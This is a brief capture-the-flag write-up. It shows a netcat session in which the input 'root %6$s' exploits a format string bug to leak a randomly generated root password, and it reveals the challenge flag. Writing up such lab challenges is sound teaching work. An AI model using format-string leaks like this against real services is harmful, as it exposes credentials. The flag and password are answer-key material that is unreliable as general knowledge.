### Chal Desc: 

root has a random password. Find the password to get the file.

$ nc cybersecweek.ua.pt 2012

#### Soln:
Format string Vuln to leak the password. We have to brute force the location to print out the flag

```python
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/downloads$ nc cybersecweek.ua.pt 2012
Generating Random Pass...Done
User: abc
abc

Invalid user

^Z
[8]+  Stopped                 nc cybersecweek.ua.pt 2012
ckc9759@ckc:/mnt/c/Users/Chaitanya K Chauhan/downloads$ nc cybersecweek.ua.pt 2012
Generating Random Pass...Done
User: root %6$s
root 2xjYV4fTq2cDJxAe

Pass: 2xjYV4fTq2cDJxAe
CTFUA{-_printf_is_not_print_-}
```

Thank yoy
